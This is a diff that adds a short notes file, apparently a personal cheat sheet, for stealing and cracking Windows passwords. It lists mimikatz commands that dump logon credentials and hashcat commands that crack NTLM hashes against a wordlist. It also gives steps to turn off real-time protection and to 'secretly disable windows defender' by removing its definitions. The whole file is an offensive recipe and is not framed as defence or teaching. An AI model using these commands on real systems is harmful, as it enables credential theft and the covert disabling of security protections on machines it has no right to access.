@@ -1,0 +1,20 @@
+mimikatz and hashcat
+
+windows 7:
+privilege::debug
+sekurlsa::logonpasswords
+
+
+windows 10:
+turn off real-time protection
+download mimikast and hashcat
+privilege::debug
+sekurlsa::logonpasswords
+copy NTLM hash and make a txt file and paste
+make a wordlist file for attack
+./hashcat -m 1000 <hashfile> <wordlist> --force
+./hashcat -m 1000 <hashfile> <wordlist> --force --show
+
+secretly disable windows defender
+
+C:\Program Files\Windows Defender\MpCmdRun.exe -RemoveDefinition -All Set-MpPreference -DisableIOAVProtection $true
